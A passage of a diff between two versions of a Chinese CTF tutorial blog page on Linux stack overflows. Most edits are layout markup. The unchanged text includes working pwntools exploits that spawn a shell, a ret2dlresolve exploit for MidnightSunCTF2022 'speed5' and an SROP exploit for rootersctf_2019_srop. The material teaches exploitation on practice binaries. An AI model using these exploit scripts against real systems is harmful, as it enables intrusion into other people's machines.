ALLOW</span><br><span class="line"> 0015: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0017</span><br><span class="line"> 0016: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure></div>
 <p>绕过方法是在 orw 之前先用 rop 调用 <code>close</code>
@@ -841,24 +864,30 @@ flag 。</p>
 esp,ebp之后还有pop
 ebp使得esp增加），通过两次leave可以将esp的值改为fake_ebp，从而完成栈迁移，这样就可以在溢出空间不足的情况下构造完整的rop链。</p>
 <h2 id="栈迁移到数据填充段">栈迁移到数据填充段</h2>
-<p><img  
+<p><img   
+                     lazyload
+                     src="/images/loading.svg"
+                     data-
                      lazyload
                      src="/images/loading.svg"
                      data-src="images/41c4d94f80c46b5ce1ddd2376a57f3d1.png"
+                     
                       
+                
                 ></p>
 <p>将栈迁移到数据填充段中，执行其中的rop。</p>
 <h2 id="栈迁移到其它空闲地址">栈迁移到其它空闲地址</h2>
-<figure>
-<img  
+<p><img   
+                     lazyload
+                     src="/images/loading.svg"
+                     data-
                      lazyload
                      src="/images/loading.svg"
                      data-src="images/db12ad52b7a1912665ab0bc5ed002e66.png"
                      
-alt="在这里插入图片描述" 
-                >
-<figcaption aria-hidden="true">在这里插入图片描述</figcaption>
-</figure>
+                      
+                
+                ></p>
 <p>调用<code>read</code>函数将rop写入空闲地址中，然后将栈迁移到该地址执行该rop。</p>
 <p>这里返回到<code>read</code>函数时会有<code>push ebp</code>保存ebp值，<code>read</code>函数中的<code>leave;ret</code>语句不会对栈迁移造成影响，因此还要再加一个<code>leave;ret</code>。</p>
 <h1 id="ret2csu">ret2csu</h1>
@@ -890,13 +919,17 @@ ret2dlresolve 则不能使用 patchelf 修改 elf
 <p>主要有 <code>.dynamic</code> 、<code>.dynstr</code>
 、<code>.dynsym</code> 和 <code>.rel.plt</code> 四个重要的 section
 。</p>
-<p>结构及关系如下如图（以 32 位为例）： <img 
+<p>结构及关系如下如图（以 32 位为例）： <img  
 
+                     lazyload
+                     src="/images/loading.svg"
+                     data-
                      lazyload
                      src="/images/loading.svg"
                      data-src="images/d05fcb3f3322bf190a51a7088d9b1ad1.png"
                      
-alt="在这里插入图片描述" 
+                      
+                
                 ></p>
 <h3 id="dyn">Dyn</h3>
 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure></div>
@@ -984,13 +1017,17 @@ linux 延迟绑定机制的原理介绍图。这里详细介绍的是该函数�
 时的执行流程进行控制流劫持，因为这个执行流程会自动计算目标函数的地址，<strong>不需要知道
 libc 具体版本</strong>，适用性更强。</p>
 <p>其中 <code>ELFW(ST_VISIBILITY) (sym-&gt;st_other)</code> 为 0 时
-<code>_dl_runtime_resolve</code> 函数的具体执行流程为： <img 
+<code>_dl_runtime_resolve</code> 函数的具体执行流程为： <img  
 
+                     lazyload
+                     src="/images/loading.svg"
+                     data-
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://i-blog.csdnimg.cn/blog_migrate/52d2f9340bd5f998d2887f40be788f3e.png%20=70%x"
                      
-alt="在这里插入图片描述" 
+                      
+                
                 ></p>
 <ul>
 <li>用 <code>link_map</code> 访问 <code>.dynamic</code> ，取出
@@ -1023,41 +1060,53 @@ Elf32_Rel</h3>
 <code>.rel.plt</code> ，进一步可以伪造 <code>.dynsym</code> 和
 <code>.dynstr</code> ，最终调用目标函数。</p>
 <p>这里以 MidnightSunCTF2022 的 <a class="link" 
- target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/2022MidnightSunCTF_speed5" >speed5 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
+ target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/2022MidnightSunCTF_speed5" >speed5<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i>
 为例讲解具体利用过程：</p>
 <p>可以看出，程序主体部分是一个非常简单的栈溢出。</p>
 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">go</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">48u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p>由于溢出长度有限，因此首先需要栈迁移到其他地址处。 <img 
+<p>由于溢出长度有限，因此首先需要栈迁移到其他地址处。 <img  
 
+                     lazyload
+                     src="/images/loading.svg"
+                     data-
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://i-blog.csdnimg.cn/blog_migrate/d9b4d1426691a6b5f2d36eab1f459760.png%20=60%x"
                      
-alt="在这里插入图片描述" 
+                      
+                
                 ></p>
 <p>为了调用 <code>_dl_runtime_resolve</code> 函数，可以把接下来 rop
-中的返回地址设为该函数的 plt 表地址。该地址对应的汇编指令如下： <img 
+中的返回地址设为该函数的 plt 表地址。该地址对应的汇编指令如下： <img  
 
+                     lazyload
+                     src="/images/loading.svg"
+                     data-
                      lazyload
                      src="/images/loading.svg"
                      data-src="images/e67b342e7833f0cba6904e7f65910901.png"
                      
-alt="在这里插入图片描述" 
+                      
+                
                 > 可以看出
 <code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> 的参数1
 <code>link_map_obj</code> 被 push 到栈中，在此之前，栈顶一定是参数2
 <code>reloc_arg</code> 。因此构造的 rop
 中接下来的值是伪造的参数2。接下来rop链的内容是目标函数的返回地址和参数（具体rop链为什么这么构造可以看前面
 ret2libc 中 linux 延迟绑定机制的原理介绍图）。</p>
-<p>之后就是伪造那 3 个结构，具体见下图。 <img 
+<p>之后就是伪造那 3 个结构，具体见下图。 <img  
 
+                     lazyload
+                     src="/images/loading.svg"
+                     data-
                      lazyload
                      src="/images/loading.svg"
                      data-src="images/6dafe13803caaf398e55613189c6bda3.png"
                      
-alt="在这里插入图片描述" 
-                > <strong>注意：如果 patchelf 修改了 ELF
-文件，那么这些表的偏移会发生改变。</strong></p>
+                      
+                
+                > <strong>注意：如果
+patchelf 修改了 ELF 文件，那么这些表的偏移会发生改变。</strong></p>
 <p>exp 如下：</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./speed5&quot;</span>)</span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line">p = process([elf.path])</span><br><span class="line"></span><br><span class="line">rop_addr = elf.bss() + <span class="number">0x700</span>  <span class="comment"># adjust according the stack when call the _dl_runtime_resolve</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2dlresolve</span>():</span><br><span class="line">    func_name = <span class="string">&quot;system&quot;</span></span><br><span class="line">    func_args = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">    resolve_plt = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header[<span class="string">&#x27;sh_addr&#x27;</span>]</span><br><span class="line">    JMPREL = elf.dynamic_value_by_tag(<span class="string">&#x27;DT_JMPREL&#x27;</span>)</span><br><span class="line">    SYMTAB = elf.dynamic_value_by_tag(<span class="string">&#x27;DT_SYMTAB&#x27;</span>)</span><br><span class="line">    STRTAB = elf.dynamic_value_by_tag(<span class="string">&#x27;DT_STRTAB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    fake_rel_addr = rop_addr + <span class="number">5</span> * <span class="number">4</span></span><br><span class="line">    reloc_offset = fake_rel_addr - JMPREL</span><br><span class="line">    fake_sym_addr = rop_addr + <span class="number">7</span> * <span class="number">4</span></span><br><span class="line">    align = (<span class="number">0x10</span> - ((fake_sym_addr - SYMTAB) &amp; <span class="number">0xF</span>)) &amp; <span class="number">0xF</span></span><br><span class="line">    fake_sym_addr += align</span><br><span class="line">    r_info = ((fake_sym_addr - SYMTAB) / <span class="number">0x10</span> &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span>  <span class="comment"># 0x7 means that Assertion `ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT&#x27;</span></span><br><span class="line">    fake_rel = p32(elf.bss() + <span class="number">0x10</span>) + p32(r_info)</span><br><span class="line">    fake_name_addr = fake_sym_addr + <span class="number">4</span> * <span class="number">4</span></span><br><span class="line">    st_name = fake_name_addr - STRTAB</span><br><span class="line">    fake_sym = p32(st_name) + p32(<span class="number">0</span>) * <span class="number">2</span> + p8(<span class="number">0x12</span>) + p8(<span class="number">0</span>) + p16(<span class="number">0</span>)</span><br><span class="line">    bin_sh_offset = (fake_sym_addr + <span class="number">0x10</span> - rop_addr + <span class="built_in">len</span>(func_name) + <span class="number">3</span>) &amp; ~<span class="number">3</span></span><br><span class="line">    bin_sh_addr = rop_addr + bin_sh_offset</span><br><span class="line"></span><br><span class="line">    payload = p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(resolve_plt)</span><br><span class="line">    payload += p32(reloc_offset)</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(bin_sh_addr)</span><br><span class="line">    payload += fake_rel</span><br><span class="line">    payload += <span class="string">&#x27;\x00&#x27;</span> * align</span><br><span class="line">    payload += fake_sym</span><br><span class="line">    payload += func_name</span><br><span class="line">    payload = payload.ljust(bin_sh_offset, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += func_args + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">24</span></span><br><span class="line">    payload += p32(rop_addr)</span><br><span class="line">    payload += p32(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    payload += p32(elf.search(asm(<span class="string">&#x27;leave;ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(rop_addr)</span><br><span class="line">    payload += p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    pause()</span><br><span class="line">    p.send(ret2dlresolve())</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure></div>
 <h2 id="位-ret2dlresolve-1">64 位 ret2dlresolve</h2>
@@ -1095,14 +1144,18 @@ libc 基址的情况下完成利用。</p>
 <code>l-&gt;l_addr + sym-&gt;st_value</code> 结果就是
 <code>system</code> 函数地址。</p></li>
 </ul>
-<p><img  
+<p><img   
+                     lazyload
+                     src="/images/loading.svg"
+                     data-
                      lazyload
                      src="/images/loading.svg"
                      data-src="images/9d2f83c616a5538a3a4ea6975318bc19.png"
                      
-alt="在这里插入图片描述" 
+                      
+                
                 > 例如 <a class="link" 
- target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/2021hgameweek3_without_leak/without_leak_b7bd5f2d0faebbc6ba6964bca265a506" >2021hgameweek3_without_leak <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
+ target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/2021hgameweek3_without_leak/without_leak_b7bd5f2d0faebbc6ba6964bca265a506" >2021hgameweek3_without_leak<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i>
 这道题目。</p>
 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 <p>栈溢出后面会关闭输出流，无法泄露 libc 地址，因此可以采用
@@ -1115,29 +1168,43 @@ ret2dlresolve 的方式实现任意命令执行。</p>
 <code>rt_sigreturn</code>
 就可以执行想要执行的函数以及把栈迁移到任意地址。</p>
 <p>以 64 位为例，其中一种构造方式如下： 其中 0xF 为
-<code>rt_sigreturn</code> 的系统调用号。 <img 
+<code>rt_sigreturn</code> 的系统调用号。 <img  
 
+                     lazyload
+                     src="/images/loading.svg"
+                     data-
                      lazyload
                      src="/images/loading.svg"
                      data-src="images/036ee63b7bb54a4fe5d98c064c787fec.png"
                      
-alt="在这里插入图片描述" 
-                > <code>Signal Frame</code> 结构如下： <img 
+                      
+                
+                >
+<code>Signal Frame</code> 结构如下： <img  
 
+                     lazyload
+                     src="/images/loading.svg"
+                     data-
                      lazyload
                      src="/images/loading.svg"
                      data-src="images/e3e1b6a53bd2c560f2b08fc27d87d60d.png"
                      
-alt="在这里插入图片描述" 
-                > 通过设置 <code>Signal Frame</code> 的 rsp
-的值栈迁移，可以连读多次进行 SROP。 <img 
-
+                      
+                
+                > 通过设置
+<code>Signal Frame</code> 的 rsp 的值栈迁移，可以连读多次进行 SROP。
+<img   
+                     lazyload
+                     src="/images/loading.svg"
+                     data-
                      lazyload
                      src="/images/loading.svg"
                      data-src="images/d69ea986473e28e4a4ac62a88a12edec.png"
                      
-alt="在这里插入图片描述" 
-                > 例题：rootersctf_2019_srop</p>
+                      
+                
+                >
+例题：rootersctf_2019_srop</p>
 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">signed</span> __int64 <span class="title">sub_401000</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">sys_write</span>(<span class="number">1u</span>, ::buf, <span class="number">0x2AuLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sys_read</span>(<span class="number">0</span>, buf, <span class="number">0x400uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 <p>存在栈溢出。</p>
 <p>可供利用的 gadget ：</p>
@@ -1150,11 +1217,11 @@ alt="在这里插入图片描述"
 。</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26384</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./rootersctf_2019_srop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./rootersctf_2019_srop&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    buf_addr = <span class="number">0x402000</span></span><br><span class="line">    syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line">    pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line"></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = <span class="number">0</span>  <span class="comment"># read</span></span><br><span class="line">    frame.rdi = <span class="number">0</span>  <span class="comment"># stdin</span></span><br><span class="line">    frame.rsi = buf_addr  <span class="comment"># buf</span></span><br><span class="line">    frame.rdx = <span class="number">0x400</span>  <span class="comment"># size</span></span><br><span class="line">    frame.rip = syscall_leave_ret</span><br><span class="line">    frame.rbp = buf_addr</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span></span><br><span class="line">    payload += p64(pop_rax_syscall_leave_ret)</span><br><span class="line">    payload += p64(<span class="number">0xF</span>)</span><br><span class="line">    payload += <span class="built_in">str</span>(frame)</span><br><span class="line"></span><br><span class="line">    p.sendafter(<span class="string">&#x27;Hey, can i get some feedback for the CTF?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = <span class="number">59</span>  <span class="comment"># execve</span></span><br><span class="line">    frame.rdi = buf_addr  <span class="comment"># &quot;/bin/sh\x00&quot;</span></span><br><span class="line">    frame.rsi = <span class="number">0</span></span><br><span class="line">    frame.rdx = <span class="number">0</span></span><br><span class="line">    frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload += p64(pop_rax_syscall_leave_ret)</span><br><span class="line">    payload += p64(<span class="number">0xF</span>)</span><br><span class="line">    payload += <span class="built_in">str</span>(frame)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure></div>
 
-        </div>
+		</div>
 
-        
-            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
-                <div class="article-copyright-info-container">
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
     <ul>
         <li><strong>Title:</strong> linux 栈溢出</li>
         <li><strong>Author:</strong> sky123</li>
@@ -1163,7 +1230,7 @@ alt="在这里插入图片描述"
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-11-18 12:47:24
+                    :</strong> 2024-11-20 03:33:31
             </li>
         
         <li>
@@ -1182,62 +1249,56 @@ alt="在这里插入图片描述"
     </ul>
 </div>
 
-            </div>
-        
+		</div>
+		
 
-        
-            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
-                
-                    <li class="tag-item mx-0.5">
-                        <a href="/tags/linux-user-pwn/">#linux user pwn</a>&nbsp;
-                    </li>
-                
-            </ul>
-        
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/linux-user-pwn/">#linux user pwn</a>&nbsp;
+			</li>
+			
+		</ul>
+		
 
-        
+		
 
-        
-            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
-                
-                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="prev"
-                        rel="prev"
-                        href="/2024/11/08/linux-format-string-exploit/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">linux 格式化字符串利用</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="next"
-                        rel="next"
-                        href="/2024/11/08/linux-IO_FILE-exploit/"
-                        >
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">linux IO_FILE 利用</span>
-                                <span class="post-nav-item">Next posts</span>
-                            </span>
-                            <span class="right arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-right"></i>
-                            </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2024/11/08/linux-format-string-exploit/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">linux 格式化字符串利用</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2024/11/08/linux-IO_FILE-exploit/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">linux IO_FILE 利用</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
 
 
-        
-            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
-                <div class="comments-container mt-10 w-full ">
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
     <div id="comment-anchor" class="w-full h-2.5"></div>
     <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
         Comments
@@ -1288,45 +1349,39 @@ alt="在这里插入图片描述"
     
 </div>
 
-            </div>
-        
-    </div>
+		</div>
+		
+	</div>
 
-    
-        <div class="toc-content-container">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <div class="toc-title">On this page</div>
-        <div class="page-title">linux 栈溢出</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="nav-text">逻辑漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2text"><span class="nav-text">ret2text</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2shellcode"><span class="nav-text">ret2shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%8B%E5%86%99"><span class="nav-text">手写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwntools-%E7%94%9F%E6%88%90"><span class="nav-text">pwntools 生成</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%AF-ascii-%E7%A0%81-shellcode"><span class="nav-text">纯 ascii 码 shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x00-%E6%88%AA%E6%96%AD"><span class="nav-text">\x00 截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95-shellcode"><span class="nav-text">测试 shellcode</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2syscall"><span class="nav-text">ret2syscall</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%8D"><span class="nav-text">32位</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%8D-1"><span class="nav-text">64位</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2libc"><span class="nav-text">ret2libc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6"><span class="nav-text">linux延迟绑定机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-text">利用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="nav-text">泄露函数地址</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#canary-%E7%BB%95%E8%BF%87"><span class="nav-text">canary 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2canary"><span class="nav-text">泄露canary</span></a></li><li class="nav-item 